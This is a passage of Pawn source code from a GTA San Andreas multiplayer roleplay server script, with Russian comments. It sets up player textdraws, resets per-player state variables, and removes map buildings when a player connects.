	LimitShow[playerid] = CreatePlayerTextDraw(playerid,364.067504, 410.083374, "MAX");
	PlayerTextDrawLetterSize(playerid,LimitShow[playerid], 0.187159, 0.713333);
	PlayerTextDrawAlignment(playerid,LimitShow[playerid], 1);
	PlayerTextDrawColor(playerid,LimitShow[playerid], 255);
	PlayerTextDrawBackgroundColor(playerid,LimitShow[playerid], 51);
	PlayerTextDrawFont(playerid,LimitShow[playerid], 1);
	PlayerTextDrawSetProportional(playerid,LimitShow[playerid], 1);
	PlayerTextDrawSetOutline(playerid,LimitShow[playerid], 0);
	PlayerTextDrawSetShadow(playerid,LimitShow[playerid],0);
	//==========================================================================
	FuelShow[playerid] = CreatePlayerTextDraw(playerid,402.017822, 389.083312, "_");
	PlayerTextDrawBackgroundColor(playerid,FuelShow[playerid], 80);
	PlayerTextDrawLetterSize(playerid,FuelShow[playerid],0.530584, 1.016667);
	PlayerTextDrawFont(playerid,FuelShow[playerid], 0);
	PlayerTextDrawColor(playerid,FuelShow[playerid], -1);
	PlayerTextDrawSetOutline(playerid,FuelShow[playerid], 1);
	PlayerTextDrawSetProportional(playerid,FuelShow[playerid],1);
	PlayerTextDrawSetShadow(playerid,FuelShow[playerid],0);
	PlayerTextDrawShow(playerid, FuelShow[playerid]);
	//==========================================================================
	FillShow[playerid] = CreatePlayerTextDraw(playerid,434.814239, 387.333526, " FUEL");
	PlayerTextDrawBackgroundColor(playerid,FillShow[playerid], 255);
	PlayerTextDrawFont(playerid,FillShow[playerid], 2);
	PlayerTextDrawLetterSize(playerid,FillShow[playerid], 0.301010, 1.308333);
	PlayerTextDrawColor(playerid,FillShow[playerid], -2147483393);
	PlayerTextDrawSetOutline(playerid,FillShow[playerid], 1);
	PlayerTextDrawSetProportional(playerid,FillShow[playerid], 1);
	PlayerTextDrawHide(playerid, FillShow[playerid]);
	//==========================================================================
	// Спидометр
	FULLRECON[playerid] = CreatePlayerTextDraw(playerid,510.000000, 120.000000, "_");
	PlayerTextDrawColor(playerid,FULLRECON[playerid], -1);
	PlayerTextDrawSetShadow(playerid,FULLRECON[playerid], 1);
	PlayerTextDrawBackgroundColor(playerid,FULLRECON[playerid], 0x00000044);
	PlayerTextDrawSetProportional(playerid,FULLRECON[playerid], 3);
	PlayerTextDrawAlignment(playerid,FULLRECON[playerid], 1);
	PlayerTextDrawFont(playerid,FULLRECON[playerid], 2);
	PlayerTextDrawSetOutline(playerid,FULLRECON[playerid], 0);
	PlayerTextDrawLetterSize(playerid,FULLRECON[playerid], 0.300000, 1.200000);
	// Выбор скина
	Select_Skin_PTD[playerid][0] = CreatePlayerTextDraw(playerid, 295.9998, 373.6799, "Homeless");
	PlayerTextDrawLetterSize(playerid, Select_Skin_PTD[playerid][0], 0.2666, 1.2681);
	PlayerTextDrawAlignment(playerid, Select_Skin_PTD[playerid][0], 1);
	PlayerTextDrawColor(playerid, Select_Skin_PTD[playerid][0], -1);
	PlayerTextDrawBackgroundColor(playerid, Select_Skin_PTD[playerid][0], 255);
	PlayerTextDrawFont(playerid, Select_Skin_PTD[playerid][0], 2);
	PlayerTextDrawSetProportional(playerid, Select_Skin_PTD[playerid][0], 1);
	PlayerTextDrawSetShadow(playerid, Select_Skin_PTD[playerid][0], 0);

	Select_Skin_PTD[playerid][1] = CreatePlayerTextDraw(playerid, 294.3998, 388.1155, "$");
	PlayerTextDrawLetterSize(playerid, Select_Skin_PTD[playerid][1], 0.4000, 1.6000);
	PlayerTextDrawAlignment(playerid, Select_Skin_PTD[playerid][1], 1);
	PlayerTextDrawColor(playerid, Select_Skin_PTD[playerid][1], 8388863);
	PlayerTextDrawBackgroundColor(playerid, Select_Skin_PTD[playerid][1], 255);
	PlayerTextDrawFont(playerid, Select_Skin_PTD[playerid][1], 2);
	PlayerTextDrawSetProportional(playerid, Select_Skin_PTD[playerid][1], 1);
	PlayerTextDrawSetShadow(playerid, Select_Skin_PTD[playerid][1], 0);
	// Голод 
	Golod_PTD[playerid][0] = CreatePlayerTextDraw(playerid, 613.5999, 138.7288, "100");
	PlayerTextDrawLetterSize(playerid, Golod_PTD[playerid][0], 0.4163, 1.8240);
	PlayerTextDrawAlignment(playerid, Golod_PTD[playerid][0], 1);
	PlayerTextDrawColor(playerid, Golod_PTD[playerid][0], 8388863);
	PlayerTextDrawSetOutline(playerid, Golod_PTD[playerid][0], 1);
	PlayerTextDrawBackgroundColor(playerid, Golod_PTD[playerid][0], 255);
	PlayerTextDrawFont(playerid, Golod_PTD[playerid][0], 3);
	PlayerTextDrawSetProportional(playerid, Golod_PTD[playerid][0], 1);
	PlayerTextDrawSetShadow(playerid, Golod_PTD[playerid][0], 0);
}
stock ResetNew(playerid)
{
	PreloadAnimLib(playerid,"CARRY");
	PreloadAnimLib(playerid,"BOMBER");
	PreloadAnimLib(playerid,"FOOD");
	PreloadAnimLib(playerid,"BAR");
	PreloadAnimLib(playerid,"CRACK");
	PreloadAnimLib(playerid,"SMOKING");
	creatcar[playerid] = -1;
	PlayerInfo[playerid][pAdmin] = 0;
	PlayerInfo[playerid][pHelper] = 0;
	tipster = -1;
	CallInfo[playerid][callused] = 0;
	tipsterlisten[playerid] = 0;
	vehicleidtp[playerid] = INVALID_VEHICLE_ID;
	DelGun(playerid);
	recognition[playerid] = 0;
	IsSmoking[playerid] = 0;
	for(new i; i < 11; i++) vidachagun[i][playerid] = 0;
	Pizdorvanka[playerid] = 0;
	dostup[playerid] = 0;
	rabotaon[playerid] = 0;
	FreezePlayer[playerid] = 1;
	nachalvzlom[playerid] = 0;
	idcarv[playerid] = 0;
	timervzlom[playerid] = 0;
	avtocar[playerid] = 0;
	timecar[playerid] = 0;
	tookmoped[playerid] = 0;
	house_car[playerid] = -1;
	mesh[playerid] = 999;
	usemesh[playerid] = 0;
	Tune[playerid] = 0;
	ZoneOffer[playerid] = 999;
	ZonePrice[playerid] = 0;
	Armour[playerid] = 0;
	robh[playerid] = false;
	play[playerid] = 0;
	KeysOffer[playerid] = 999;
	KeysGram[playerid]= 999;
	KeysPrice[playerid]= 999;
	DrugOffer[playerid] = 999;
	DrugPrice[playerid]= 999;
	DrugGram[playerid]= 999;
	ZoneOffer[playerid]= 999;
	ZonePrice[playerid]= 999;
	FreeOffer[playerid]= 999;
	TicketOffer[playerid] = 999;
	TicketMoney[playerid] = 0;
	ProposeOffer[playerid] = 999;
	MarryWitness[playerid] = 999;
	MarryWitnessOffer[playerid] = 999;
	InviteOffer[playerid] = 999;
	MarriageCeremoney[playerid] = 0;
	ProposedTo[playerid] = 999;
	GotProposedBy[playerid] = 999;
	DivorceOffer[playerid] = 999;
	PlayerInfo[playerid][pChas] = 0;
	PlayerInfo[playerid][pMin] = 0;
	lsacarvertexit[playerid] = 0;
	MatsArmyCar[playerid]= 0;
	//PlayerInfo[playerid][pSpawnChange] = 1;
	CharPrice[playerid] = 0;
	SelectCharID[playerid] = 0;
	chet[playerid] = 0;
	RaceCP[playerid] = 0;
	PicCP[playerid] = 0;
	SelectChar[playerid] = 0;
	PhoneOnline[playerid] = 0;
	ChosenSkin[playerid] = 0;
	ClothesRound[playerid] = 0;
	InviteSkin[playerid] = 0;
	PEfir[playerid] = 255;
	Pefir[playerid] = 0;
	Works[playerid] = false;
	JobCP[playerid] = 0;
	GruzCP[playerid] = 0;
	JobAmmount[playerid] = 0;
	OldSkin[playerid] = 320;
	TakingLesson[playerid] = 0;
	JobOffer[playerid] = 999;
	Employer[playerid] = 999;
	ConsumingMoney[playerid] = 0;
	CallLawyer[playerid] = 0;
	KickPlayer[playerid] = 0;
	CurrentMoney[playerid] = 0;
	CP[playerid] = 0;
	RaceCP[playerid] = 0;
	//PlayerInfo[playerid][pSpawnChange] = 1;
	TalkingLive[playerid] = 255;
	TalkingLivels[playerid] = 255;
	TalkingLivelv[playerid] = 255;
	LiveOffer[playerid] = 999;
	LiveOfferlv[playerid] = 999;
	LiveOfferls[playerid] = 999;
	TranPlayer[playerid] = 999;
	RepairOffer[playerid] = 999;
	RepairPrice[playerid] = 0;
	RepairCar[playerid] = 0;
	TieTime[playerid] = 0;
	RefillOffer[playerid] = 999;
	RefillPrice[playerid] = 0;
	PlayerCuffed[playerid] = 0;
	PlayerCuffedTime[playerid] = 0;
	RegistrationStep[playerid] = 0;
	DrugGram[playerid] = 0;
	ConnectedToPC[playerid] = 0;
	PlayerTied[playerid] = 0;
	Mobile[playerid] = 999;
	Tel[playerid] = 255;
	Rekl[playerid] = 1;
	gLastCar[playerid] = 0;
	FirstSpawn[playerid] = 0;
	Report[playerid] = 0;
	gNews[playerid] = 1;
	lNews[playerid] = 1;
	LvNews[playerid] = 1;
	BigEar[playerid] = 0;
	gDice[playerid] = 0;
	PlayerInfo[playerid][pLogin] = 0;
	gPlayerLogTries[playerid] = 0;
	gLog[playerid] = 1;
	gPlayerSpawned[playerid] = 0;
	PlayerTazeTime[playerid] = 0;
	StartTime[playerid] = 0;
	MatsHolding[playerid] = 0;
	TutTime[playerid] = 0;
	Locator[playerid] = 0;
	PlayerDrunk[playerid] = 0;
	WatchingTV[playerid] = 0;
	MarryWitness[playerid] = 999;
	MarryWitnessOffer[playerid] = 999;
	MarriageCeremoney[playerid] = 0;
	KrishaOffer[playerid] = 999;
	PlayerInfo[playerid][pDLevel] = 0;
	PlayerInfo[playerid][pDExp] = 0;
	PlayerInfo[playerid][pDgruz] = 0;
	PlayerInfo[playerid][pPSkill] = 0;
	PlayerInfo[playerid][pPProc] = 0;
	PlayerInfo[playerid][pPMGruz] = 0;
	DriverJob[playerid] = false;
	GivePlayerPPCash(playerid,PlayerInfo[playerid][pCash]);
	OldSkin[playerid] = GetPlayerSkin(playerid);
	ChosenSkin[playerid] = OldSkin[playerid];
	InviteSkin[playerid] = OldSkin[playerid];
	//
	for(new i = 1; i <= TOTALGZ; i++) GangZoneShowForPlayer(playerid,GZInfo[i][gZone],GetGangZoneColor(i));
	for(new i = 0; i < 46; i++) Weapons[playerid][i] = 0;
	Goto[playerid] = true;
	AdminVehicle[playerid][createdveh] = -1;
	AdminVehicle[playerid][vehid] = 522;
	AdminVehicle[playerid][color1] = 0;
	AdminVehicle[playerid][color2] = 0;
}

publics: OnPlayerWeaponShot(playerid, weaponid, hittype, hitid, Float:fX, Float:fY, Float:fZ)
{
	TimeNumberShotTarget[playerid]++;
	TimeNumberShot[playerid]++;
	//
	/*new Float:armour;
	GetPlayerArmour(playerid, armour);
	if(armour <= 0)
	{
		if(weaponid == 24) PlayerInfo[hitid][pHP]-=40;//DesertEagle
	    if(weaponid == 23) PlayerInfo[hitid][pHP]-=10;//SilencedColt
	    if(weaponid == 31) PlayerInfo[hitid][pHP]-=15;//M4
	    if(weaponid == 30) PlayerInfo[hitid][pHP]-=15;//AK
	    if(weaponid == 29) PlayerInfo[hitid][pHP]-=18;//MP5
	    if(weaponid == 34) PlayerInfo[hitid][pHP]-=50;//SniperRifle
	    if(weaponid == 25) PlayerInfo[hitid][pHP]-=25;//PumpShotgun
    }
    else
    {
    	if(weaponid == 24) armour-=40;//DesertEagle
	    if(weaponid == 23) armour-=10;//SilencedColt
	    if(weaponid == 31) armour-=15;//M4
	    if(weaponid == 30) armour-=15;//AK
	    if(weaponid == 29) armour-=18;//MP5
	    if(weaponid == 34) armour-=50;//SniperRifle
	    if(weaponid == 25) armour-=25;//PumpShotgun
	    SetPlayerArmourAC(hitid, armour);
    }
	//
	if(PlayerInfo[hitid][pHP] <= 0) SetPlayerHealthAC(hitid, PlayerInfo[hitid][pHP]);*/
	if(hittype == 1)
	{
		SERIU[playerid][SShout][0]++;
		SERIU[playerid][SShout][1]++;
		SERIU[playerid][SShout][2]++;
		SERIU[playerid][SShout][3]++;
	}
	if(hittype == BULLET_HIT_TYPE_PLAYER && AGM[hitid]) return 0;
	return true;
}
public OnPlayerEnterDynamicArea(playerid, STREAMER_TAG_AREA areaid)
{
	return true;
}
public OnPlayerLeaveDynamicArea(playerid, STREAMER_TAG_AREA areaid)
{
	return true;
}
public OnPlayerConnect(playerid)
{
    EnablePlayerCameraTarget(playerid, 1);
	//
	for(new i = 0; i < 10; i++) TextDrawShowForPlayer(playerid, Logotip_TD[i]);
	//
	//================================= ROB's ==================================
	robsdraw[playerid] = CreatePlayerTextDraw(playerid, 200.995651, 391.999938, "~b~[IIIIIIIIIIIIIIIIIIIIIIIIIIIIII~b~]");
	PlayerTextDrawLetterSize(playerid, robsdraw[playerid], 0.584465, 2.889167);
	PlayerTextDrawAlignment(playerid, robsdraw[playerid], 1);
	PlayerTextDrawColor(playerid, robsdraw[playerid], -1);
	PlayerTextDrawSetShadow(playerid, robsdraw[playerid], 0);
	PlayerTextDrawSetOutline(playerid, robsdraw[playerid], 1);
	PlayerTextDrawBackgroundColor(playerid, robsdraw[playerid], 51);
	PlayerTextDrawFont(playerid, robsdraw[playerid], 1);
	PlayerTextDrawSetProportional(playerid, robsdraw[playerid], 1);
	//==========================================================================
	SetPVarInt(playerid, "chosencar", -1);
	if(rr == 1) return Kick(playerid);
	NewTazer[playerid] = false;
	cuffto[playerid] = 9999;
	Convoi[playerid] = 9999;
	AutoSaloon[playerid] = false;
	AGM[playerid] = false;
	GiveMF[playerid] = false;
	zips[playerid] = false;
	training[playerid] = 0;
	CP[playerid] = 0;
	robscdtimer[playerid] = -1;
	Players[players++]=playerid;
	if(SERVERTEST) SendMes(playerid,COLOR_BLUE,"CONNECT: PLAYERID - %i",playerid);
	format(string,90, "{33AA33}Склад армии ЛВ: {FFFFFF}%i", armmatbi);
	UpdateDynamic3DTextLabelText(LvaLable, 0xFFFF00FF, string);
	SetPVarInt(playerid, "AntiBreik", 500);
	SetPVarInt(playerid, "WarnCarShot", 2);
	CarOffer[playerid] = 999;
	chooses[playerid] = 1000;
	CarPrice[playerid] = 999;
	SetPVarInt(playerid,"CarOffer",9999);
	BoyWin[playerid] = 0;
	BoyOffer[playerid] = 999;
	if(slit > 0) Kick(playerid);
	updatecheck[playerid] = 9999;
	togran[playerid] = 0;
	times[playerid] = true;
	choosebiz[playerid] = 0;
	accept_car_damage[playerid] = 0;
	last_vehicle_health[playerid] = 0;
	//-------------- Триггеры -----------------
	CreateTrigger(2355.255127,1676.049561,3039.100098); // autoschool
	CreateTrigger(864.6805,322.7838,1078.4357-1.77); // mary Z position -1.77
	CreateTrigger(1160.4260,-1770.3188,14.8238); // helpcheck Z position -1.77
	CreateTrigger(1398.002808,-1693.363281,37.794899); // bank 1
	CreateTrigger(1395.500732,-1693.363281,37.794899); // bank 2
	CreateTrigger(1400.531738,-1693.363281,37.794899); // bank 3
	CreateTrigger(1392.902954,-1693.363281,37.794899); // bank 4
	CreateTrigger(1403.054321,-1693.363281,37.794899); // bank 5
	//-------------- Триггеры -----------------
	CreateObject(19375, 487.86032, -1735.24438, 15.28290,   0.00000, 0.00000, -98.02002);
	CreateObject(19375, 1843.35425, -1854.93701, 10.37142,   0.00000, 0.00000, 0.00000);
	CreateObject(19375, 1042.64954, -1025.81384, 30.47056,   0.00000, 0.00000, -90.23997);
	CreateObject(19375, 1026.93445, -1029.23767, 30.57440,   0.00000, 0.00000, 89.52000);
	CreateObject(19375, 2386.28101, 1043.47778, 12.00083,   0.00000, 0.00000, -90.35997);
	CreateObject(19375, -1935.98901, 238.63142, 32.16383,   0.00000, 0.00000, -90.48000);
	CreateObject(19375, -2716.06567, 216.67769, 2.83182,   0.00000, 0.00000, 0.00000);
	CreateObject(19375, 2071.53809, -1831.58606, 12.15108,   0.00000, 0.00000, 0.00000);
	SDuty[playerid] = 0;
	PlayerInfo[playerid][pLogin] = 0;
	PlayerInfo[playerid][pTut] = 0;
	format(PlayerInfo[playerid][pvIp],16,"no");
	ChatOOC[playerid] = 1;
	shotTime[playerid] = 0;
	ClearAnimations(playerid);
	shot[playerid] = 0;
	peremennn[playerid] = 0;
	SetPlayerHealthAC(playerid, 100);
	GangZoneShowForPlayer(playerid, SFa, COLOR_YELLOW2);
	GangZoneShowForPlayer(playerid, LSport, COLOR_YELLOW2);
	TextDrawHideForPlayer(playerid, Speed);
	TextDrawHideForPlayer(playerid, DRAP);
	GetPlayerName(playerid, PlayerInfo[playerid][pName], MAX_PLAYER_NAME);
	if(strcmp(PlayerInfo[playerid][pName],"None",true) == 0) return kick(playerid);
	PlayerArmor[playerid] = 0;
	//new unixtime = GetTickCount();
	new ip[32];
	GetPlayerIp(playerid,ip,32);
	//======================================
	OpustitRuki[playerid] = 0;
	ZapretDice[playerid] = 0;
	KostiName[playerid] = 999;
	KostiMoney[playerid] = 0;
	DiceOffers[playerid] = 999;
	//========================BANK EVOLVE-RP=================================//
	RemoveBuildingForPlayer(playerid, 1226, 1433.709961, -1702.359009, 16.421000, 0.250000);
	RemoveBuildingForPlayer(playerid, 1226, 1433.709961, -1676.687012, 16.421000, 0.250000);
	RemoveBuildingForPlayer(playerid, 1226, 1433.709961, -1656.250000, 16.421000, 0.250000);
	//========================AUTOSCHOOL COPY EVOLVE-RP=================================//
    RemoveBuildingForPlayer(playerid, 1532, -2025.828979, -102.469002, 34.272999, 0.250000);
	RemoveBuildingForPlayer(playerid, 1497, -2029.020020, -120.063004, 34.257000, 0.250000);
	RemoveBuildingForPlayer(playerid, 11015, -2028.130005, -111.273003, 36.132000, 0.250000);
	RemoveBuildingForPlayer(playerid, 11371, -2028.130005, -111.273003, 36.132000, 0.250000);
	RemoveBuildingForPlayer(playerid, 11014, -2076.438965, -107.930000, 36.967999, 0.250000);
	RemoveBuildingForPlayer(playerid, 11372, -2076.438965, -107.930000, 36.967999, 0.250000);
	RemoveBuildingForPlayer(playerid, 11099, -2056.989014, -184.546005, 34.414001, 0.250000);
	RemoveBuildingForPlayer(playerid, 11083, -2053.908936, -180.835007, 37.327999, 0.250000);
	RemoveBuildingForPlayer(playerid, 11153, -2053.908936, -180.835007, 37.327999, 0.250000);
	RemoveBuildingForPlayer(playerid, 11372, -2076.437500, -107.929703, 36.968800, 0.250000);
	RemoveBuildingForPlayer(playerid, 11014, -2076.437500, -107.929703, 36.968800, 0.250000);
	//========================Грузчики=======================================//
	RemoveBuildingForPlayer(playerid, 3744, 2193.2578, -2286.2891, 14.8125, 0.25);
	RemoveBuildingForPlayer(playerid, 3574, 2193.2578, -2286.2891, 14.8125, 0.25);
	RemoveBuildingForPlayer(playerid, 5262, 2152.7109, -2256.7813, 15.2109, 0.25);
	RemoveBuildingForPlayer(playerid, 3633, 2158.0078, -2257.2656, 16.2188, 0.25);
	RemoveBuildingForPlayer(playerid, 3633, 2167.6641, -2256.7813, 12.7500, 0.25);
	RemoveBuildingForPlayer(playerid, 3633, 2167.6641, -2256.7813, 13.7109, 0.25);
	RemoveBuildingForPlayer(playerid, 3633, 2167.6641, -2256.7813, 14.6719, 0.25);
	RemoveBuildingForPlayer(playerid, 3632, 2167.8047, -2257.3516, 16.3828, 0.25);
	RemoveBuildingForPlayer(playerid, 3632, 2167.1719, -2257.1250, 16.4063, 0.25);
	RemoveBuildingForPlayer(playerid, 3577, 2170.0781, -2257.6641, 16.0391, 0.25);
	RemoveBuildingForPlayer(playerid, 3632, 2169.3516, -2258.0703, 17.2422, 0.25);
	RemoveBuildingForPlayer(playerid, 3632, 2168.8281, -2257.5234, 17.2500, 0.25);
	RemoveBuildingForPlayer(playerid, 3632, 2150.6641, -2251.5547, 12.7656, 0.25);
	RemoveBuildingForPlayer(playerid, 3632, 2150.2813, -2250.8516, 12.7656, 0.25);
	RemoveBuildingForPlayer(playerid, 3633, 2150.6953, -2252.9141, 16.2344, 0.25);
	RemoveBuildingForPlayer(playerid, 3632, 2149.8125, -2253.3672, 16.2344, 0.25);
	RemoveBuildingForPlayer(playerid, 3633, 2153.7734, -2253.0859, 14.2031, 0.25);
	RemoveBuildingForPlayer(playerid, 3633, 2154.5078, -2254.4766, 14.2109, 0.25);
	RemoveBuildingForPlayer(playerid, 3632, 2158.5703, -2251.0156, 15.8125, 0.25);
	RemoveBuildingForPlayer(playerid, 3632, 2158.0469, -2250.5078, 15.8125, 0.25);
	RemoveBuildingForPlayer(playerid, 5132, 2163.2891, -2251.6094, 14.1406, 0.25);
	//==================================================================
	RemoveBuildingForPlayer(playerid, 3630, 2217.5859, -2284.6641, 15.2344, 0.25); // У грузчиков
	RemoveBuildingForPlayer(playerid, 17772, 2870.2422, -1589.3906, 16.5625, 0.25);
	RemoveBuildingForPlayer(playerid, 17550, 2870.2229, -1589.3374, 16.5625, 0.25);
	RemoveBuildingForPlayer(playerid, 10575, -2716.3516, 217.4766, 5.3828, 0.25);
	RemoveBuildingForPlayer(playerid, 11313, -1935.8594, 239.5313, 35.3516, 0.25);
	RemoveBuildingForPlayer(playerid, 11319, -1904.5313, 277.8984, 42.9531, 0.25);
	RemoveBuildingForPlayer(playerid, 9625, -2425.7266, 1027.9922, 52.2813, 0.25);
	RemoveBuildingForPlayer(playerid, 9093, 2386.6563, 1043.6016, 11.5938, 0.25);
	// Парковка у мэрии
	RemoveBuildingForPlayer(playerid, 4057, 1479.5547, -1693.1406, 19.5781, 0.25);
	RemoveBuildingForPlayer(playerid, 4210, 1479.5625, -1631.4531, 12.0781, 0.25);
	RemoveBuildingForPlayer(playerid, 713, 1457.9375, -1620.6953, 13.4531, 0.25);
	RemoveBuildingForPlayer(playerid, 713, 1496.8672, -1707.8203, 13.4063, 0.25);
	RemoveBuildingForPlayer(playerid, 1283, 1430.1719, -1719.4688, 15.6250, 0.25);
	RemoveBuildingForPlayer(playerid, 1226, 1451.6250, -1727.6719, 16.4219, 0.25);
	RemoveBuildingForPlayer(playerid, 1226, 1467.9844, -1727.6719, 16.4219, 0.25);
	RemoveBuildingForPlayer(playerid, 1226, 1485.1719, -1727.6719, 16.4219, 0.25);
	RemoveBuildingForPlayer(playerid, 1280, 1468.9844, -1713.5078, 13.4531, 0.25);
	RemoveBuildingForPlayer(playerid, 1231, 1479.6953, -1716.7031, 15.6250, 0.25);
	RemoveBuildingForPlayer(playerid, 1226, 1505.1797, -1727.6719, 16.4219, 0.25);
	RemoveBuildingForPlayer(playerid, 1280, 1488.7656, -1713.7031, 13.4531, 0.25);
	RemoveBuildingForPlayer(playerid, 1289, 1504.7500, -1711.8828, 13.5938, 0.25);
	RemoveBuildingForPlayer(playerid, 620, 1516.0000, -1748.6016, 13.0078, 0.25);
	RemoveBuildingForPlayer(playerid, 1258, 1445.0078, -1704.7656, 13.6953, 0.25);
	RemoveBuildingForPlayer(playerid, 1226, 1433.7109, -1702.3594, 16.4219, 0.25);
	RemoveBuildingForPlayer(playerid, 1226, 1433.7109, -1676.6875, 16.4219, 0.25);
	RemoveBuildingForPlayer(playerid, 1258, 1445.0078, -1692.2344, 13.6953, 0.25);
	RemoveBuildingForPlayer(playerid, 1226, 1433.7109, -1656.2500, 16.4219, 0.25);
	RemoveBuildingForPlayer(playerid, 1226, 1433.7109, -1636.2344, 16.4219, 0.25);
	RemoveBuildingForPlayer(playerid, 712, 1445.8125, -1650.0234, 22.2578, 0.25);
	RemoveBuildingForPlayer(playerid, 1226, 1433.7109, -1619.0547, 16.4219, 0.25);
	RemoveBuildingForPlayer(playerid, 1283, 1443.2031, -1592.9453, 15.6250, 0.25);
	RemoveBuildingForPlayer(playerid, 673, 1457.7266, -1710.0625, 12.3984, 0.25);
	RemoveBuildingForPlayer(playerid, 620, 1461.6563, -1707.6875, 11.8359, 0.25);
	RemoveBuildingForPlayer(playerid, 1280, 1468.9844, -1704.6406, 13.4531, 0.25);
	RemoveBuildingForPlayer(playerid, 700, 1463.0625, -1701.5703, 13.7266, 0.25);
	RemoveBuildingForPlayer(playerid, 1231, 1479.6953, -1702.5313, 15.6250, 0.25);
	RemoveBuildingForPlayer(playerid, 673, 1457.5547, -1697.2891, 12.3984, 0.25);
	RemoveBuildingForPlayer(playerid, 1280, 1468.9844, -1694.0469, 13.4531, 0.25);
	RemoveBuildingForPlayer(playerid, 1231, 1479.3828, -1692.3906, 15.6328, 0.25);
	RemoveBuildingForPlayer(playerid, 4186, 1479.5547, -1693.1406, 19.5781, 0.25);
	RemoveBuildingForPlayer(playerid, 620, 1461.1250, -1687.5625, 11.8359, 0.25);
	RemoveBuildingForPlayer(playerid, 700, 1463.0625, -1690.6484, 13.7266, 0.25);
	RemoveBuildingForPlayer(playerid, 641, 1458.6172, -1684.1328, 11.1016, 0.25);
	RemoveBuildingForPlayer(playerid, 625, 1457.2734, -1666.2969, 13.6953, 0.25);
	RemoveBuildingForPlayer(playerid, 1280, 1468.9844, -1682.7188, 13.4531, 0.25);
	RemoveBuildingForPlayer(playerid, 712, 1471.4063, -1666.1797, 22.2578, 0.25);
	RemoveBuildingForPlayer(playerid, 1231, 1479.3828, -1682.3125, 15.6328, 0.25);
	RemoveBuildingForPlayer(playerid, 625, 1458.2578, -1659.2578, 13.6953, 0.25);
	RemoveBuildingForPlayer(playerid, 712, 1449.8516, -1655.9375, 22.2578, 0.25);
	RemoveBuildingForPlayer(playerid, 1231, 1477.9375, -1652.7266, 15.6328, 0.25);
	RemoveBuildingForPlayer(playerid, 1280, 1479.6094, -1653.2500, 13.4531, 0.25);
	RemoveBuildingForPlayer(playerid, 625, 1457.3516, -1650.5703, 13.6953, 0.25);
	RemoveBuildingForPlayer(playerid, 625, 1454.4219, -1642.4922, 13.6953, 0.25);
	RemoveBuildingForPlayer(playerid, 1280, 1467.8516, -1646.5938, 13.4531, 0.25);
	RemoveBuildingForPlayer(playerid, 1280, 1472.8984, -1651.5078, 13.4531, 0.25);
	RemoveBuildingForPlayer(playerid, 1280, 1465.9375, -1639.8203, 13.4531, 0.25);
	RemoveBuildingForPlayer(playerid, 1231, 1466.4688, -1637.9609, 15.6328, 0.25);
	RemoveBuildingForPlayer(playerid, 625, 1449.5938, -1635.0469, 13.6953, 0.25);
	RemoveBuildingForPlayer(playerid, 1280, 1467.7109, -1632.8906, 13.4531, 0.25);
	RemoveBuildingForPlayer(playerid, 1232, 1465.8906, -1629.9766, 15.5313, 0.25);
	RemoveBuildingForPlayer(playerid, 1280, 1472.6641, -1627.8828, 13.4531, 0.25);
	RemoveBuildingForPlayer(playerid, 1280, 1479.4688, -1626.0234, 13.4531, 0.25);
	RemoveBuildingForPlayer(playerid, 3985, 1479.5625, -1631.4531, 12.0781, 0.25);
	RemoveBuildingForPlayer(playerid, 4206, 1479.5547, -1639.6094, 13.6484, 0.25);
	RemoveBuildingForPlayer(playerid, 1232, 1465.8359, -1608.3750, 15.3750, 0.25);
	RemoveBuildingForPlayer(playerid, 1229, 1466.4844, -1598.0938, 14.1094, 0.25);
	RemoveBuildingForPlayer(playerid, 1226, 1451.3359, -1596.7031, 16.4219, 0.25);
	RemoveBuildingForPlayer(playerid, 1226, 1471.3516, -1596.7031, 16.4219, 0.25);
	RemoveBuildingForPlayer(playerid, 1280, 1488.7656, -1704.5938, 13.4531, 0.25);
	RemoveBuildingForPlayer(playerid, 700, 1494.2109, -1694.4375, 13.7266, 0.25);
	RemoveBuildingForPlayer(playerid, 1280, 1488.7656, -1693.7344, 13.4531, 0.25);
	RemoveBuildingForPlayer(playerid, 620, 1496.9766, -1686.8516, 11.8359, 0.25);
	RemoveBuildingForPlayer(playerid, 641, 1494.1406, -1689.2344, 11.1016, 0.25);
	RemoveBuildingForPlayer(playerid, 1280, 1488.7656, -1682.6719, 13.4531, 0.25);
	RemoveBuildingForPlayer(playerid, 712, 1480.6094, -1666.1797, 22.2578, 0.25);
	RemoveBuildingForPlayer(playerid, 712, 1488.2266, -1666.1797, 22.2578, 0.25);
	RemoveBuildingForPlayer(playerid, 1280, 1486.4063, -1651.3906, 13.4531, 0.25);
	RemoveBuildingForPlayer(playerid, 1280, 1491.3672, -1646.3828, 13.4531, 0.25);
	RemoveBuildingForPlayer(playerid, 1280, 1493.1328, -1639.4531, 13.4531, 0.25);
	RemoveBuildingForPlayer(playerid, 1280, 1486.1797, -1627.7656, 13.4531, 0.25);
	RemoveBuildingForPlayer(playerid, 1280, 1491.2188, -1632.6797, 13.4531, 0.25);
	RemoveBuildingForPlayer(playerid, 1232, 1494.4141, -1629.9766, 15.5313, 0.25);
	RemoveBuildingForPlayer(playerid, 1232, 1494.3594, -1608.3750, 15.3750, 0.25);
	RemoveBuildingForPlayer(playerid, 1226, 1488.5313, -1596.7031, 16.4219, 0.25);
	RemoveBuildingForPlayer(playerid, 1229, 1498.0547, -1598.0938, 14.1094, 0.25);
	RemoveBuildingForPlayer(playerid, 1288, 1504.7500, -1705.4063, 13.5938, 0.25);
	RemoveBuildingForPlayer(playerid, 1287, 1504.7500, -1704.4688, 13.5938, 0.25);
	RemoveBuildingForPlayer(playerid, 1286, 1504.7500, -1695.0547, 13.5938, 0.25);
	RemoveBuildingForPlayer(playerid, 1285, 1504.7500, -1694.0391, 13.5938, 0.25);
	RemoveBuildingForPlayer(playerid, 673, 1498.9609, -1684.6094, 12.3984, 0.25);
	RemoveBuildingForPlayer(playerid, 625, 1504.1641, -1662.0156, 13.6953, 0.25);
	RemoveBuildingForPlayer(playerid, 625, 1504.7188, -1670.9219, 13.6953, 0.25);
	RemoveBuildingForPlayer(playerid, 620, 1503.1875, -1621.1250, 11.8359, 0.25);
	RemoveBuildingForPlayer(playerid, 673, 1501.2813, -1624.5781, 12.3984, 0.25);
	RemoveBuildingForPlayer(playerid, 673, 1498.3594, -1616.9688, 12.3984, 0.25);
	RemoveBuildingForPlayer(playerid, 1226, 1504.8906, -1596.7031, 16.4219, 0.25);
	RemoveBuildingForPlayer(playerid, 712, 1508.4453, -1668.7422, 22.2578, 0.25);
	RemoveBuildingForPlayer(playerid, 625, 1505.6953, -1654.8359, 13.6953, 0.25);
	RemoveBuildingForPlayer(playerid, 625, 1508.5156, -1647.8594, 13.6953, 0.25);
